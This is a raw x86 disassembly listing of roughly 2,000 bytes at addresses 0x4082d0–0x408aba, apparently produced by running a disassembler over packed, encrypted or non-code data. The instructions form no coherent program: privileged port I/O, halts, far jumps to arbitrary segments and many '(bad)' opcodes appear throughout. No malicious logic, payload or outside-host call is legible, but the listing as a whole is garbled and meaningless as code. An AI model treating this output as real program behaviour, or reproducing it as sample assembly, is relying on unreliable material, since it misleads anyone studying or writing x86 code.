  4082d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d1:	jl     0x40825d
  4082d3:	dec    edi
  4082d4:	jmp    0xe453:0x6245c34b
  4082db:	mov    bp,0x1160
  4082df:	imul   esi,DWORD PTR [eax+0xa],0x25
  4082e3:	mov    ecx,0x35ab0d7f
  4082e8:	xchg   edx,eax
  4082e9:	mov    ds:0x40a24ac7,al
  4082ee:	sbb    al,0xe4
  4082f0:	and    bh,al
  4082f2:	adc    DWORD PTR [ecx-0x2a5c4dcb],esi
  4082f8:	sub    BYTE PTR [edx],al
  4082fa:	int3   
  4082fb:	je     0x408346
  4082fd:	arpl   bx,dx
  4082ff:	lea    ebp,fs:[eax+ebp*8-0x26a839f2]
  408307:	stos   BYTE PTR es:[edi],al
  408308:	fdivr  QWORD PTR [edx]
  40830a:	sbb    DWORD PTR [ebp+0x3e048533],ebx
  408310:	mov    esi,0x8dcbcb93
  408315:	and    al,0x26
  408317:	dec    eax
  408318:	and    BYTE PTR fs:[ebx+ebp*4],0x26
  40831d:	in     eax,dx
  40831e:	pop    es
  40831f:	fiadd  DWORD PTR [ecx+0x21c256cc]
  408325:	fsubr  QWORD PTR [ecx-0x1e36849f]
  40832b:	sub    cl,BYTE PTR [ebx-0x5e]
  40832e:	out    0xdf,al
  408330:	out    0xac,al
  408332:	lods   eax,DWORD PTR ds:[esi]
  408333:	hlt    
  408334:	mov    edi,0x699708b
  408339:	jno    0x40834e
  40833b:	and    DWORD PTR [ebp-0x62],ebx
  40833e:	jmp    0xb848:0x20dfb7ab
  408345:	jno    0x408382
  408347:	dec    esp
  408348:	xchg   esp,edx
  40834a:	pop    ds
  40834b:	mov    ebp,0xd631de2
  408350:	cmp    eax,0x89f09a21
  408355:	mul    edx
  408357:	loop   0x408327
  408359:	in     eax,0x64
  40835b:	xlat   BYTE PTR ds:[ebx]
  40835c:	pushf  
  40835d:	int    0x1e
  40835f:	adc    ebp,edi
  408361:	inc    edi
  408362:	daa    
  408363:	js     0x408330
  408365:	lods   eax,DWORD PTR ds:[esi]
  408366:	fcomp  QWORD PTR [edx-0x26]
  408369:	in     al,dx
  40836a:	inc    ecx
  40836b:	xlat   BYTE PTR ds:[ebx]
  40836c:	cmp    esi,DWORD PTR [edx+0x488d258a]
  408372:	arpl   WORD PTR [edx],dx
  408374:	jl     0x408365
  408376:	enter  0x7108,0x8
  40837a:	repnz mov ecx,0x26ad796f
  408380:	push   ebx
  408381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408382:	cmp    esp,DWORD PTR [edi+ebp*4]
  408385:	repnz sub DWORD PTR [edi],esp
  408388:	ins    BYTE PTR es:[edi],dx
  408389:	pop    ecx
  40838a:	dec    ecx
  40838b:	and    al,0x18
  40838d:	sub    ah,BYTE PTR [edx]
  40838f:	pushf  
  408390:	icebp  
  408391:	mov    al,0xb7
  408393:	cli    
  408394:	sbb    ebp,ebx
  408396:	aas    
  408397:	shr    BYTE PTR [esi],cl
  408399:	mov    eax,esp
  40839b:	sahf   
  40839c:	inc    esp
  40839d:	mov    ebp,0xe3f54232
  4083a2:	cmp    edi,ebx
  4083a4:	mov    edx,0x320381cb
  4083a9:	gs mov esi,0x7710649f
  4083af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083b0:	sub    al,0x75
  4083b2:	dec    ebx
  4083b3:	xchg   ebp,eax
  4083b4:	int    0xf0
  4083b6:	inc    edx
  4083b7:	xchg   edx,eax
  4083b8:	std    
  4083b9:	mov    gs,eax
  4083bb:	pop    es
  4083bc:	ss addr16 jg 0x408341
  4083c0:	sbb    DWORD PTR [edx],esi
  4083c2:	ins    DWORD PTR es:[edi],dx
  4083c3:	xor    esp,edi
  4083c5:	jl     0x4083d1
  4083c7:	cmp    eax,0xb4ac0fff
  4083cc:	outs   dx,DWORD PTR ds:[esi]
  4083cd:	mov    esi,0xc9464778
  4083d2:	mov    cl,0x67
  4083d4:	push   esi
  4083d5:	shl    BYTE PTR [esi],cl
  4083d7:	dec    edi
  4083d8:	cmp    BYTE PTR [ecx+ecx*8],bh
  4083db:	jno    0x408436
  4083dd:	pop    eax
  4083de:	call   0xc5fe:0xab030e39
  4083e5:	neg    BYTE PTR [ebp+0x54]
  4083e8:	xchg   eax,edx
  4083ea:	or     DWORD PTR [ebx],ecx
  4083ec:	out    0x6a,al
  4083ee:	dec    edi
  4083ef:	push   ds
  4083f0:	mov    ch,0x87
  4083f2:	leave  
  4083f3:	(bad)  
  4083f4:	push   ecx
  4083f5:	fs ins BYTE PTR es:[edi],dx
  4083f7:	dec    ebp
  4083f8:	push   edx
  4083f9:	add    esi,edi
  4083fb:	mov    ah,0x52
  4083fd:	sti    
  4083fe:	xchg   edx,ebx
  408400:	cmp    al,0xc
  408402:	or     dl,bh
  408404:	inc    eax
  408405:	adc    eax,0xa0e21588
  40840a:	dec    edx
  40840b:	test   eax,0x829618d6
  408410:	jmp    0x5a37158d
  408415:	mov    ds:0x9b36de64,eax
  40841a:	adc    DWORD PTR [edi+0xe],ecx
  40841d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40841e:	mov    dl,0x1
  408420:	cmp    dl,BYTE PTR [edx]
  408422:	push   0x9bffb2c0
  408427:	lock mov ds:0xd3532820,eax
  40842e:	jmp    0xc4c6c50f
  408433:	dec    eax
  408434:	gs pop esi
  408436:	or     ecx,DWORD PTR [esi-0x667beca1]
  40843c:	inc    ebx
  40843d:	(bad)  
  40843e:	dec    ecx
  40843f:	lahf   
  408440:	jmp    0x97aa:0x97f11904
  408447:	enter  0xd180,0x2
  40844b:	xchg   BYTE PTR [edx+0x7515026f],dl
  408451:	and    al,0x20
  408453:	add    eax,0xb684b4a5
  408458:	cmp    ebp,DWORD PTR [edx+0x4ea90a44]
  40845e:	xor    BYTE PTR [ebx-0x32ba8fa2],bh
  408464:	in     eax,dx
  408465:	dec    ebp
  408466:	pop    ebx
  408467:	sub    eax,0xa3f5a752
  40846c:	pushaw 
  40846e:	(bad)  
  40846f:	adc    BYTE PTR [edi],0xd8
  408472:	rcr    DWORD PTR [edx-0x10],0xc4
  408476:	dec    esi
  408477:	mov    al,0xda
  408479:	loop   0x408427
  40847b:	and    cl,BYTE PTR [ecx]
  40847d:	shl    DWORD PTR [ecx],cl
  40847f:	ror    edi,1
  408481:	shl    BYTE PTR [ecx-0x94ed32c],cl
  408487:	cwde   
  408488:	or     DWORD PTR [edx-0x1b],esi
  40848b:	adc    al,0xe3
  40848d:	bound  ecx,QWORD PTR [eax]
  40848f:	shl    BYTE PTR [edi+0x125d5cb8],0x5f
  408496:	and    al,0xd0
  408498:	dec    edx
  408499:	ret    0x2681
  40849c:	push   es
  40849d:	sub    cl,0xbe
  4084a0:	scas   eax,DWORD PTR es:[edi]
  4084a1:	mov    edi,0x4e2a11ce
  4084a6:	fnsave [edi]
  4084a8:	fwait
  4084a9:	pusha  
  4084aa:	cmc    
  4084ab:	dec    eax
  4084ac:	xlat   BYTE PTR ds:[ebx]
  4084ad:	push   eax
  4084ae:	rcl    BYTE PTR [ebx],0xdb
  4084b1:	lods   al,BYTE PTR ds:[esi]
  4084b2:	pushf  
  4084b3:	repz xor ch,BYTE PTR [ebx+ecx*2]
  4084b7:	pop    ebx
  4084b8:	pop    ebx
  4084b9:	mov    BYTE PTR [edx],0xb5
  4084bc:	dec    eax
  4084bd:	in     eax,dx
  4084be:	cmp    esp,ebp
  4084c0:	stos   DWORD PTR es:[edi],eax
  4084c1:	addr16 and ah,dl
  4084c4:	jb     0x408543
  4084c6:	sbb    DWORD PTR [esi+0x4f],edx
  4084c9:	xor    ecx,DWORD PTR [ebx-0x45aa496e]
  4084cf:	out    0x15,eax
  4084d1:	xor    bh,bl
  4084d3:	or     ah,BYTE PTR [ebx-0x1a8bb9a9]
  4084d9:	lds    edx,FWORD PTR [edi+0x6]
  4084dc:	dec    edx
  4084dd:	gs iret 
  4084df:	sub    DWORD PTR [eax+0x34a964e2],0xffffffcc
  4084e6:	loope  0x408478
  4084e8:	and    dh,BYTE PTR [edx]
  4084ea:	push   ecx
  4084eb:	jge    0x4084fd
  4084ed:	or     dh,BYTE PTR [esi+edx*4+0x48]
  4084f1:	jmp    0x408546
  4084f3:	lods   eax,DWORD PTR ds:[esi]
  4084f4:	aaa    
  4084f5:	out    dx,al
  4084f6:	sti    
  4084f7:	jnp    0x408568
  4084f9:	iret   
  4084fa:	mov    esp,0x42e57ae0
  4084ff:	sub    ebx,DWORD PTR [ecx+0x64]
  408502:	pop    edi
  408503:	pop    es
  408504:	popa   
  408505:	add    eax,0x960edc80
  40850a:	adc    al,0xeb
  40850c:	sub    eax,ebp
  40850e:	ins    BYTE PTR es:[edi],dx
  40850f:	cli    
  408510:	xchg   ebx,eax
  408511:	sahf   
  408512:	xchg   ecx,eax
  408513:	inc    edx
  408514:	add    eax,0xcb5fb4cc
  408519:	adc    eax,0x63223f45
  40851e:	into   
  40851f:	mov    esi,0x5425d97d
  408524:	push   edx
  408525:	popa   
  408526:	push   edi
  408527:	loopne 0x4085a8
  408529:	rcr    DWORD PTR [edx+eiz*1],1
  40852c:	inc    ebx
  40852d:	out    dx,al
  40852e:	push   ebp
  40852f:	add    eax,DWORD PTR [esi-0x67d7ace2]
  408535:	push   0x9224a804
  40853a:	test   al,0xd7
  40853c:	sbb    BYTE PTR [ebp+0x43],bl
  40853f:	imul   edx,DWORD PTR [eax],0x4f9e986
  408545:	mov    esp,0x6ef93320
  40854a:	and    bl,BYTE PTR [eax-0x38]
  40854d:	xchg   esp,eax
  40854e:	retf   
  40854f:	inc    edx
  408550:	sbb    BYTE PTR [ebx-0x636511e4],cl
  408556:	inc    ebp
  408557:	scas   eax,DWORD PTR es:[edi]
  408558:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40855a:	mov    ebp,es
  40855c:	dec    ebx
  40855d:	rcl    bh,0x15
  408560:	clc    
  408561:	hlt    
  408562:	push   esi
  408563:	sub    eax,0x2ae37e2b
  408568:	adc    ebx,DWORD PTR [edx+edi*1+0x2c]
  40856c:	repnz loopne 0x4085d1
  40856f:	xor    al,0x9
  408571:	jp     0x408582
  408573:	jp     0x408596
  408575:	sub    bl,BYTE PTR [eax-0x1a]
  408578:	add    ch,BYTE PTR [edx+0x1bfe3ffc]
  40857e:	dec    ebp
  40857f:	fsubr  QWORD PTR [ebp-0x1d2d7bba]
  408585:	cmp    DWORD PTR [eax+0x5d5bf7a5],0xbae34518
  40858f:	push   edi
  408590:	cld    
  408591:	lahf   
  408592:	inc    esi
  408593:	cmp    eax,0x5e0b8a45
  408598:	sti    
  408599:	test   eax,0x9c06db60
  40859e:	unpckhps xmm6,XMMWORD PTR [ecx-0x66af51a9]
  4085a5:	push   edi
  4085a6:	inc    esi
  4085a7:	jp     0x4085b7
  4085a9:	mov    BYTE PTR [esi],cl
  4085ab:	pop    esp
  4085ac:	dec    edi
  4085ad:	stos   BYTE PTR es:[edi],al
  4085ae:	retf   
  4085af:	jns    0x408618
  4085b1:	mov    eax,0x3de58cc6
  4085b6:	je     0x4085e2
  4085b8:	inc    edx
  4085b9:	inc    ebx
  4085ba:	sbb    DWORD PTR [ebx+edx*2-0x137c104f],esp
  4085c1:	rcl    DWORD PTR [esi-0x67cc8351],cl
  4085c7:	push   es
  4085c8:	pop    DWORD PTR [edi]
  4085ca:	fmul   DWORD PTR [eax-0x72]
  4085cd:	stos   DWORD PTR es:[edi],eax
  4085ce:	repnz sar DWORD PTR [eax],0x47
  4085d2:	and    DWORD PTR ds:0xbb8bbba6,esi
  4085d8:	or     BYTE PTR [edi-0x4ee3fc2c],bl
  4085de:	dec    esp
  4085df:	repz rcl BYTE PTR [edx-0x24e2ad83],cl
  4085e6:	addr16 xchg esi,eax
  4085e8:	dec    ebp
  4085e9:	mov    dh,0xd8
  4085eb:	inc    esi
  4085ec:	xchg   BYTE PTR [edx-0x60],cl
  4085ef:	test   ch,bh
  4085f1:	int    0xbb
  4085f3:	lds    esp,FWORD PTR ss:[esi-0x5f9848e2]
  4085fa:	push   edi
  4085fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085fc:	loope  0x4085a5
  4085fe:	and    BYTE PTR [esi],cl
  408600:	shl    BYTE PTR [ebp+0xcc21515],cl
  408606:	inc    edx
  408607:	xchg   edi,eax
  408608:	es loopne 0x408681
  40860b:	fwait
  40860c:	imul   esp,DWORD PTR [esi+0x1],0xffffff9a
  408610:	sbb    eax,0x2ee3289d
  408615:	add    DWORD PTR [edx+0x632e6e0d],eax
  40861b:	test   al,0xd6
  40861d:	(bad)  
  40861e:	imul   DWORD PTR [edx-0x6f0fcdb9]
  408624:	rol    BYTE PTR [edi+0x34],1
  408627:	and    esi,0x8c0bbc0e
  40862d:	loop   0x4085c7
  40862f:	push   0x3d6070bb
  408634:	in     al,dx
  408635:	pusha  
  408636:	lods   eax,DWORD PTR ds:[esi]
  408637:	mov    esp,0x5b335996
  40863c:	ds lahf 
  40863e:	lods   eax,DWORD PTR ds:[esi]
  40863f:	xchg   esi,eax
  408640:	push   edx
  408641:	(bad)  
  408642:	mov    ebx,0xfcc60488
  408647:	sub    DWORD PTR [ebx+ebx*4],0xffffff94
  40864b:	fcom   DWORD PTR [edx-0x40]
  40864e:	inc    edi
  40864f:	jmp    0xf5f7:0x9d943d9e
  408656:	popa   
  408657:	mov    bh,0x9b
  408659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40865a:	int3   
  40865b:	call   0x1615:0x32b8019
  408662:	arpl   WORD PTR [ecx],ax
  408664:	pop    edi
  408665:	pop    edi
  408666:	adc    edi,DWORD PTR [edx]
  408668:	push   ebp
  408669:	or     DWORD PTR [esi],edi
  40866b:	sub    DWORD PTR [ecx-0x34e52c11],edi
  408671:	je     0x408671
  408673:	push   ebp
  408674:	rol    ebx,0x57
  408677:	mov    esi,0x76b557a1
  40867c:	ins    DWORD PTR es:[edi],dx
  40867d:	sahf   
  40867e:	jmp    DWORD PTR [edx+0x6e4d2f18]
  408684:	xchg   ecx,eax
  408685:	rcr    al,1
  408687:	iret   
  408688:	fldenv [edx-0x2f]
  40868b:	out    0x8c,eax
  40868d:	add    eax,0x3b7a2346
  408692:	pop    ds
  408693:	mov    ss,WORD PTR [ebp+0x392a35f8]
  408699:	call   0xffa4:0x6748d371
  4086a0:	adc    DWORD PTR [esi+esi*2],esp
  4086a3:	aad    0x96
  4086a5:	fdivp  st(5),st
  4086a8:	pop    eax
  4086a9:	fdivr  DWORD PTR [edi-0x61]
  4086ac:	ds xchg edi,eax
  4086ae:	into   
  4086af:	and    bl,BYTE PTR [ebp-0x53]
  4086b2:	je     0x408668
  4086b4:	adc    DWORD PTR [eax+0x36],ecx
  4086b7:	or     BYTE PTR [edx+0x5c],dh
  4086ba:	js     0x4086b2
  4086bc:	mov    BYTE PTR [ebx+0xd],bh
  4086bf:	sbb    al,0x46
  4086c1:	cmp    al,0x45
  4086c3:	jbe    0x40870b
  4086c5:	jge    0x40871f
  4086c7:	mov    eax,0x841b8268
  4086cc:	sbb    BYTE PTR [esp+ebp*1],0xd7
  4086d0:	test   eax,0x7fc945a6
  4086d5:	mov    ebx,0xf661783d
  4086da:	jmp    0xc065:0xe4a3b65d
  4086e1:	test   dh,dl
  4086e3:	stc    
  4086e4:	das    
  4086e5:	xor    edi,DWORD PTR [ebx-0x71]
  4086e8:	out    0xc6,al
  4086ea:	out    dx,al
  4086eb:	dec    eax
  4086ec:	(bad)  
  4086ed:	pop    edx
  4086ee:	ss ss mov eax,0xa7d7e3db
  4086f5:	sbb    al,0x76
  4086f7:	pop    esi
  4086f8:	and    esp,esi
  4086fa:	(bad)  [ebx]
  4086fc:	mov    cl,0xc0
  4086fe:	in     eax,dx
  4086ff:	enter  0xe648,0xd
  408703:	sar    ah,1
  408705:	cmp    dh,BYTE PTR [edi]
  408707:	and    DWORD PTR [edi],esi
  408709:	jecxz  0x4086a3
  40870b:	or     dl,dh
  40870d:	stos   BYTE PTR es:[edi],al
  40870e:	mov    cl,0x54
  408710:	xlat   BYTE PTR ds:[ebx]
  408711:	jns    0x40873c
  408713:	or     bl,BYTE PTR [ebp-0x7e]
  408716:	sbb    ch,BYTE PTR [edi]
  408718:	inc    esp
  408719:	jp     0x408782
  40871b:	push   ebx
  40871c:	mov    bh,0xce
  40871e:	in     eax,0xb
  408720:	mov    ecx,0x3aa4025a
  408725:	mov    cl,0xbe
  408727:	in     eax,0x3f
  408729:	lock sti 
  40872b:	fisub  WORD PTR [edx+0x3bef6965]
  408731:	mov    ah,0xc7
  408733:	cmp    al,0xe1
  408735:	fisub  DWORD PTR [edx]
  408737:	push   ebx
  408738:	dec    esp
  408739:	ins    DWORD PTR es:[edi],dx
  40873a:	scas   eax,DWORD PTR es:[edi]
  40873b:	sbb    eax,0x79a2438
  408740:	xchg   edi,eax
  408741:	mov    ebx,0xcb3b6a61
  408746:	lock jno 0x40876a
  408749:	jmp    DWORD PTR [edi+0x60]
  40874c:	xchg   ebx,eax
  40874d:	cwde   
  40874e:	outs   dx,DWORD PTR ds:[esi]
  40874f:	adc    eax,DWORD PTR [eax-0x2d0ea86a]
  408755:	in     eax,dx
  408756:	cld    
  408757:	or     DWORD PTR [eax+0x11bd052f],ecx
  40875d:	mov    BYTE PTR [ebx+0x5f],al
  408760:	mov    ds:0xf5c38afc,al
  408765:	mov    bh,0x4c
  408767:	ret    
  408768:	mov    cl,BYTE PTR [ebx]
  40876a:	jl     0x4087e4
  40876c:	inc    ebp
  40876d:	out    0xa,eax
  40876f:	clc    
  408770:	cmp    al,BYTE PTR [edi-0x33]
  408773:	mov    dx,WORD PTR cs:[edi+0x3e3a26dc]
  40877b:	data16 jae 0x408775
  40877e:	leave  
  40877f:	(bad)  
  408780:	shr    ch,1
  408782:	adc    DWORD PTR gs:[esp+eax*8-0xd],esp
  408787:	std    
  408788:	into   
  408789:	int3   
  40878a:	cwde   
  40878b:	loop   0x40875a
  40878d:	jecxz  0x4087da
  40878f:	mov    edx,0x2149c707
  408794:	int    0x3f
  408796:	inc    ebx
  408797:	cmp    al,0x7e
  408799:	out    dx,ax
  40879b:	push   eax
  40879c:	int    0xa6
  40879e:	cli    
  40879f:	mov    ebp,0xa458c45
  4087a4:	rcl    DWORD PTR [ecx+0x10],cl
  4087a7:	hlt    
  4087a8:	imul   ebp,DWORD PTR [edx],0x7a744e7a
  4087ae:	jle    0x408796
  4087b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b1:	ret    0x57c3
  4087b4:	jo     0x40882a
  4087b6:	aaa    
  4087b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087b8:	fcmovu st,st(2)
  4087ba:	bound  eax,QWORD PTR ds:0x3c302cd2
  4087c0:	xor    eax,0xd8fcc5df
  4087c5:	push   0x1
  4087c7:	ret    
  4087c8:	cld    
  4087c9:	jp     0x408815
  4087cb:	in     al,dx
  4087cc:	test   BYTE PTR [edi-0x7eeee106],0x1d
  4087d3:	mov    cl,0xa6
  4087d5:	add    eax,0x666778d3
  4087da:	pop    ebx
  4087db:	or     eax,DWORD PTR [esi+0x6419b2bc]
  4087e1:	jmp    0xb1e5015b
  4087e6:	repnz pop ecx
  4087e8:	add    al,0xa0
  4087ea:	sbb    WORD PTR [eax],0x5f11
  4087ef:	mov    esp,0xb7570b58
  4087f4:	mov    ds:0x440345ce,al
  4087f9:	push   es
  4087fa:	add    DWORD PTR [ebx+0x656b9d8d],esi
  408800:	xchg   edx,eax
  408801:	xor    DWORD PTR [esi+0x3b],edx
  408804:	(bad)
  408807:	cmp    edi,edi
  408809:	mov    bh,BYTE PTR [eax+0x6c]
  40880c:	sub    eax,0x6891deb8
  408811:	enter  0x918,0x51
  408815:	inc    esp
  408816:	and    dl,BYTE PTR [esp+ebp*4-0xb]
  40881a:	jp     0x408848
  40881c:	push   esp
  40881d:	mov    ch,0x7
  40881f:	add    esi,ecx
  408821:	sub    cl,BYTE PTR [esi+eiz*1-0x5b01953e]
  408828:	fld    DWORD PTR [edx]
  40882a:	bound  ebp,QWORD PTR [ecx]
  40882c:	jecxz  0x408870
  40882e:	test   DWORD PTR [ebp+0x60f0e316],edx
  408834:	pop    ebx
  408835:	jmp    0x3d4ee7f0
  40883a:	popa   
  40883b:	mov    dl,0x9e
  40883d:	stos   DWORD PTR es:[edi],eax
  40883e:	fiadd  WORD PTR [ecx]
  408840:	imul   esi,DWORD PTR [edi+esi*1],0xbc70db88
  408847:	lea    edi,[ebp-0x2]
  40884a:	rcr    DWORD PTR [edi+0x488fd48a],cl
  408850:	es lock pop esp
  408853:	repnz xchg esp,eax
  408855:	jno    0x4088d0
  408857:	les    ebx,FWORD PTR [esi+0x963906d]
  40885d:	imul   edi,DWORD PTR [ecx],0xfffffff6
  408860:	bound  ebx,QWORD PTR [esi-0x2c]
  408863:	inc    esp
  408864:	rcr    BYTE PTR [edi-0x361525f4],1
  40886a:	stos   BYTE PTR es:[edi],al
  40886b:	push   ds
  40886c:	ret    0x30df
  40886f:	inc    edx
  408870:	xor    DWORD PTR ds:0x8ce20707,esi
  408876:	mov    esp,0xaddaf107
  40887b:	xchg   esp,eax
  40887c:	popa   
  40887d:	jmp    0x55a046ea
  408882:	mov    esi,0x1fc6db3d
  408887:	lds    esi,FWORD PTR [ecx]
  408889:	xchg   esp,eax
  40888a:	fcmovne st,st(4)
  40888c:	mov    ah,dh
  40888e:	mov    ch,0xaa
  408890:	loopne 0x4088be
  408892:	sub    edi,DWORD PTR [edi+ecx*1-0xec233c3]
  408899:	mov    esi,0x8bdc384c
  40889e:	lods   al,BYTE PTR ds:[esi]
  40889f:	push   esi
  4088a0:	or     al,BYTE PTR [esi-0x4]
  4088a3:	fbld   TBYTE PTR [ecx]
  4088a5:	scas   eax,DWORD PTR es:[edi]
  4088a6:	and    ebx,DWORD PTR [ecx-0x1c2c7312]
  4088ac:	mov    edx,0x31c5b3cf
  4088b1:	adc    BYTE PTR [edx+0x6c],dh
  4088b4:	test   eax,0x357cf1ac
  4088b9:	test   DWORD PTR [ebp-0x5eb60a84],ecx
  4088bf:	cs icebp 
  4088c1:	jge    0x40885e
  4088c3:	call   edi
  4088c5:	clc    
  4088c6:	lahf   
  4088c7:	(bad)  
  4088c8:	xchg   esi,eax
  4088c9:	pop    ecx
  4088ca:	or     al,BYTE PTR [eax+ebp*1-0x32b03d63]
  4088d1:	and    BYTE PTR [edi-0x13],0xd5
  4088d5:	test   DWORD PTR [ecx-0x7d6f8731],edx
  4088db:	adc    BYTE PTR [esi-0x2aa636a6],0x43
  4088e2:	jecxz  0x40889f
  4088e4:	ficomp WORD PTR [esi]
  4088e6:	adc    bh,BYTE PTR [edx-0x9]
  4088e9:	ror    bl,1
  4088eb:	dec    edx
  4088ec:	cmp    al,0x72
  4088ee:	test   BYTE PTR [edx+0x68380637],0xee
  4088f5:	mov    WORD PTR [ebp+0x5740bfb9],?
  4088fb:	out    dx,eax
  4088fc:	mov    eax,ds:0xde53ea11
  408901:	add    DWORD PTR [ebp-0xb324af6],ecx
  408907:	jnp    0x408910
  408909:	sbb    DWORD PTR [edi-0x5e],ebp
  40890c:	fcom   st(0)
  40890e:	or     DWORD PTR [esi-0x2a],0x1c
  408912:	loopne 0x4088c1
  408914:	xchg   esp,eax
  408915:	sbb    bl,BYTE PTR [eax-0x2c581713]
  40891b:	add    eax,0x64219313
  408920:	add    BYTE PTR [eax-0x4f],ah
  408923:	add    BYTE PTR [esp+ebp*2],bh
  408926:	out    0x6c,al
  408928:	repz pop ds
  40892a:	and    BYTE PTR [eax+0x2d],dl
  40892d:	icebp  
  40892e:	sub    DWORD PTR [edx+eax*1],0xefff57d0
  408935:	sar    ch,0xbd
  408938:	loopne 0x408908
  40893a:	lahf   
  40893b:	out    0x39,al
  40893d:	in     al,0x41
  40893f:	pushf  
  408940:	ins    BYTE PTR es:[edi],dx
  408941:	stos   DWORD PTR es:[edi],eax
  408942:	xchg   edx,eax
  408943:	rcl    BYTE PTR [ebp+edx*2-0x5a],1
  408947:	cld    
  408948:	ret    
  408949:	jg     0x40892c
  40894b:	pop    ss
  40894c:	xor    al,0x12
  40894e:	xchg   esi,eax
  40894f:	repz add dh,BYTE PTR [ebx+edi*4]
  408953:	dec    edi
  408954:	je     0x408921
  408956:	inc    ebx
  408957:	int    0x9c
  408959:	lds    eax,FWORD PTR [ecx+esi*1+0x47855f52]
  408960:	gs call 0x7ee1:0x940aaaf4
  408968:	push   0x23
  40896a:	int3   
  40896b:	(bad)  
  40896c:	cmp    DWORD PTR ds:0xcdd1ceca,edx
  408972:	mov    dh,0x42
  408974:	shl    DWORD PTR [edi+0x4029e6f7],cl
  40897a:	sbb    DWORD PTR [edx+0x39],esi
  40897d:	lods   eax,DWORD PTR ds:[esi]
  40897e:	jle    0x40898c
  408980:	cld    
  408981:	dec    ebx
  408982:	call   0xe82048da
  408987:	std    
  408988:	xor    cl,BYTE PTR [ecx+esi*8+0x55]
  40898c:	sbb    al,0xd1
  40898e:	loope  0x40897f
  408990:	dec    edi
  408991:	or     al,0x36
  408993:	daa    
  408994:	pusha  
  408995:	idiv   DWORD PTR [edx]
  408997:	xor    DWORD PTR [ebx+esi*2-0x56129a2d],edi
  40899e:	mov    WORD PTR [edx-0x5a294e52],fs
  4089a4:	xor    esi,ebx
  4089a6:	mov    bl,ch
  4089a8:	xchg   DWORD PTR [ebp-0x20c8cf3c],edi
  4089ae:	pop    esp
  4089af:	lods   al,BYTE PTR ds:[esi]
  4089b0:	sbb    DWORD PTR [esi-0x6a],0x5bb57940
  4089b7:	fs int3 
  4089b9:	jno    0x4089c0
  4089bb:	cmp    esp,eax
  4089bd:	push   es
  4089be:	xlat   BYTE PTR ds:[ebx]
  4089bf:	jmp    0x4089e6
  4089c1:	lds    ebx,FWORD PTR [ebx-0x18132b63]
  4089c7:	iret   
  4089c8:	cs dec esi
  4089ca:	xchg   BYTE PTR [ebp+0x2],ch
  4089cd:	adc    dh,dl
  4089cf:	mov    cl,0xc5
  4089d1:	pop    ds
  4089d2:	fs stc 
  4089d4:	out    dx,al
  4089d5:	fmul   QWORD PTR [eax]
  4089d7:	dec    ebx
  4089d8:	xor    eax,0xc7c767db
  4089dd:	jb     0x408a27
  4089df:	into   
  4089e0:	xchg   ecx,eax
  4089e1:	pop    ebp
  4089e2:	mov    ah,0x87
  4089e4:	call   0xeb8445b2
  4089e9:	mov    bh,0x25
  4089eb:	adc    BYTE PTR cs:[ebx-0x7923bec3],dh
  4089f2:	sub    eax,0x661e90c4
  4089f7:	test   eax,0x9b8333d1
  4089fc:	push   cs
  4089fd:	(bad)  
  4089fe:	pop    eax
  4089ff:	inc    ebx
  408a00:	loop   0x408997
  408a02:	stos   DWORD PTR es:[edi],eax
  408a03:	jns    0x408a66
  408a05:	out    0x1e,eax
  408a07:	dec    edi
  408a08:	fsubr  QWORD PTR [ebx-0x61e357cd]
  408a0e:	dec    ecx
  408a0f:	stc    
  408a10:	sub    ebx,DWORD PTR [ebp+0x5321d7ce]
  408a16:	fisub  WORD PTR [eax+edx*4]
  408a19:	icebp  
  408a1a:	cmp    ah,BYTE PTR [eax+0x4b]
  408a1d:	leave  
  408a1e:	xchg   ebx,eax
  408a1f:	jp     0x408a75
  408a21:	popf   
  408a22:	(bad)  
  408a23:	sbb    ebx,esi
  408a25:	cli    
  408a26:	retf   
  408a27:	mov    ecx,0x9a7a6b2c
  408a2c:	dec    edx
  408a2d:	lods   al,BYTE PTR ds:[esi]
  408a2e:	sub    BYTE PTR ds:0x114e3c1c,dh
  408a34:	aas    
  408a35:	xchg   ebp,eax
  408a36:	and    al,0xa6
  408a38:	test   BYTE PTR [ebx],bh
  408a3a:	adc    al,0x1d
  408a3c:	jmp    0x408a4b
  408a3e:	repz inc edx
  408a40:	mov    esi,0xe3b92092
  408a45:	xor    BYTE PTR [edx-0x47],ah
  408a48:	je     0x408ab0
  408a4a:	mov    dh,0xc3
  408a4c:	retf   
  408a4d:	hlt    
  408a4e:	push   0xbcf5bdc9
  408a53:	in     eax,dx
  408a54:	or     esp,DWORD PTR [esi]
  408a56:	in     eax,dx
  408a57:	cmp    eax,0x9b214f21
  408a5c:	aas    
  408a5d:	sbb    eax,0xe4b7a89d
  408a62:	pop    esi
  408a63:	aad    0xd0
  408a65:	out    0x4a,al
  408a67:	outs   dx,DWORD PTR ds:[esi]
  408a68:	mov    ecx,?
  408a6a:	add    BYTE PTR [ecx-0x6626d3b5],cl
  408a70:	jbe    0x408a24
  408a72:	ja     0x408ab9
  408a74:	retf   
  408a75:	fistp  QWORD PTR [ebx-0x2e]
  408a78:	ss dec ecx
  408a7a:	mov    fs,WORD PTR [eax]
  408a7c:	or     ebp,DWORD PTR [ecx]
  408a7e:	pop    ecx
  408a7f:	jp     0x408ac4
  408a81:	mov    DWORD PTR [edx],edi
  408a83:	test   eax,0xea82b702
  408a88:	sub    edi,DWORD PTR [esi+0x7a]
  408a8b:	mov    bl,ch
  408a8d:	xchg   ebp,eax
  408a8e:	mov    ds:0x28f85706,al
  408a93:	xor    bh,BYTE PTR [ecx-0x8]
  408a96:	daa    
  408a97:	push   edx
  408a98:	je     0x408a4e
  408a9a:	pushf  
  408a9b:	mov    al,0x45
  408a9d:	push   ebx
  408a9e:	bound  eax,QWORD PTR [ecx]
  408aa0:	loope  0x408aa7
  408aa2:	mov    WORD PTR cs:[eax],ss
  408aa5:	jmp    0x29dc331d
  408aaa:	mov    esi,ds
  408aac:	popa   
  408aad:	ja     0x408abe
  408aaf:	dec    edi
  408ab0:	dec    edx
  408ab1:	call   0xba47:0xbc330197
  408ab8:	repnz icebp 
  408aba:	pop    esi
